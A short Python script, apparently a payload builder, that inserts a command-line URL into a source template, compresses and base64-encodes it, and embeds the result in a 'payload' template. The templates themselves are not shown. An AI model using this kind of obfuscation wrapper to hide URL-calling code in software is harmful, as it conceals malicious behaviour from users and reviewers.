import base64
import zlib
import sys

if len(sys.argv) < 2:
    print("Usage: python generate.py <URL>")
    sys.exit(1)

url = sys.argv[1]

with open("source.py.template", "r") as f:
    src_code = f.read()

src_code = src_code.replace("{{URL_REPLACE}}", url)

src_code = src_code.encode()
z_src_code = zlib.compress(src_code)
b64_src_code = base64.b64encode(z_src_code).decode()

with open("payload.py.template", "r") as f:
    payload = f.read()

payload = payload.replace("{{BASE64_REPLACE}}", b64_src_code)
print(payload)
